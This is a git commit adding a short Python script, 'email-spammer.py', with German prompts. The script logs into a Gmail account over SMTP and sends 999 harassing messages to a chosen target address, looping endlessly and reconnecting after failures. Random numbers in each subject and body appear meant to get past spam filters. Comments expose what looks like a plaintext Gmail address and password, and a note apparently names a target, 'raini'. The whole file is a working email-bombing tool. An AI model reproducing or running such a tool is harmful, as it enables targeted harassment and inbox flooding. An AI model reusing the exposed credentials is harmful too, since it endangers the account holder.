c7a708cd98e14c1b6ffe35207a5e9d12bd091545
ErumTheFox <74709343+ErumTheFox@users.noreply.github.com>
2021-10-08 18:26:28 +0200

    Add files via upload

---
+++ email-spammer.py
@@ -0,0 +1,60 @@
+from email.mime.text import MIMEText
+from time import sleep
+from random import randint
+import smtplib
+from colored import fg, attr
+import os
+
+
+def boot():
+    print("======================================================================")
+    print("|                        E-Mail Spammer Tool                         |")
+    print("|                            Made by %sErum%s                            |" % (fg(1), attr(0)))
+    print("======================================================================")
+
+boot()
+username = input(str("E-Mail Adresse    : "))
+password = input(str("E-Mail Passwort   : "))
+
+#catchmeifucan80085@gmail.com
+#SandKastenMeister#223
+
+def cls():
+    os.system('cls')
+
+
+def server_start():
+    server = smtplib.SMTP("smtp.gmail.com")
+    server.ehlo()
+    server.starttls()
+    server.login(username, password)
+    return server
+
+def spamm(server):
+    cls()
+    boot()
+    emails = input(str("E-Mail zum Angreifen: "))
+    for mailanz in range(1, 1000):
+        print(f"=={mailanz}== wurden gesendet!")
+        msg = MIMEText(
+        "We will never forget!" + str(randint(1,9999))
+        )
+        msg["Subject"] = "Das Internet vergisst nie! " + str(randint(1, 9999))
+        msg["From"] = username
+        msg["To"] = emails
+        server.sendmail(username, emails, msg.as_string())
+
+def main():
+    while True:
+        server = server_start()
+        try:
+            spamm(server)
+        except Exception as e:
+            sleep(60)
+
+while True:
+    main()
+
+
+#Mails an raini
+#951
